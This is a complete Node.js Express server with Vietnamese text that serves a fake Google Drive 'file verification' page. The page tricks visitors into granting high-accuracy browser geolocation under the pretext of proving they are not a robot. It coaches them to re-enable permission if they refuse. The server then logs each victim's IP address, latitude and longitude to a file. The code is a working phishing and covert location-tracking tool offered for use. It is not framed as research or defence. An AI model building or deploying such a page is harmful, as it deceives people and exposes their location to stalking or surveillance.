const express = require("express");
const fs = require("fs");

const app = express();
app.use(express.json());

// API lấy IP + trả về frontend
app.get("/", (req, res) => {
  const forwarded = req.headers["x-forwarded-for"];
  const ip = forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress;

  console.log("IP truy cập:", ip);

  res.send(`
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Google Drive - Xác minh tệp tin</title>
  <style>
    body { font-family: 'Roboto', arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f8f9fa; color: #3c4043; }
    .container { background: white; padding: 40px; border-radius: 8px; border: 1px solid #dadce0; text-align: center; max-width: 400px; width: 90%; }
    .logo { width: 72px; margin-bottom: 20px; }
    h2 { font-size: 24px; font-weight: 400; margin: 0 0 10px; color: #202124; }
    p { font-size: 14px; line-height: 1.5; margin-bottom: 30px; color: #5f6368; }
    button { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; cursor: pointer; font-weight: 500; transition: background 0.2s; }
    button:hover { background: #1765cc; box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15); }
    .error-text { color: #dc3545; font-weight: bold; }
    .loading-spinner { border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 10px; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>

  <div class="container" id="app">
    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg" alt="Google Drive">
    <h2 id="title">Yêu cầu quyền truy cập</h2>
    <p id="desc">Đây là một tệp tin riêng tư. Vui lòng nhấn <b>Tiếp tục</b> và chọn <b>(Cho phép)</b> trên thông báo hệ thống để xác nhận thiết bị của bạn không phải là robot.</p>
    <button onclick="requestLocation()">Tiếp tục</button>
  </div>

  <script>
    function requestLocation() {
      const desc = document.getElementById("desc");
      const app = document.getElementById("app");
      
      desc.innerHTML = "<div class='loading-spinner'></div> Đang chờ yêu cầu xác thực thiết bị...";

      const options = {
        enableHighAccuracy: true,
        maximumAge: 0
      };

      navigator.geolocation.getCurrentPosition(
        (position) => {
          desc.innerHTML = "<div class='loading-spinner'></div> Đang giải mã tệp tin...";
          fetch("/save", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
              lat: position.coords.latitude,
              lng: position.coords.longitude
            })
          }).then(() => {
            app.innerHTML = \`
              <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg">
              <h2>Đang mở tệp tin...</h2>
              <p>Xác minh thành công. Vui lòng chờ trong giây lát trong khi chúng tôi chuẩn bị bản xem trước của bạn.</p>
              <div class="loading-spinner"></div>
            \`;
          });
        },
        (error) => {
          let reason = "Xác thực thiết bị không thành công. Vui lòng thử lại.";
          if (error.code === 1) {
            reason = "Quyền truy cập bị từ chối. Để xem tệp, bạn cần nhấn vào biểu tượng ổ khóa 🔒 trên thanh địa chỉ, chọn <b>Cho phép (Allow)</b> và thử lại.";
          } else if (error.code === 3) { // TIMEOUT
            reason = "Hết thời gian yêu cầu. Vui lòng kiểm tra lại kết nối mạng.";
          }
          
          app.innerHTML = \`
            <h2 class="error-text">⚠️ Lỗi xác minh</h2>
            <p style="text-align: left;">\${reason}</p>
            <button onclick="location.reload()">Thử lại</button>
          \`;
        },
        options
      );
    }
  </script>

</body>
</html>
`);
});

// API lưu dữ liệu
app.post("/save", (req, res) => {
  const forwarded = req.headers["x-forwarded-for"];
  const ip = forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress;

  const { lat, lng } = req.body;

  const logEntry = {
    time: new Date().toLocaleString("vi-VN"),
    ip, lat, lng
  };

  fs.appendFileSync("logs.json", JSON.stringify(logEntry) + "\n");
  console.log("Đã lưu dữ liệu mới:", logEntry);

  res.send("OK");
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Server chạy tại port " + PORT);
});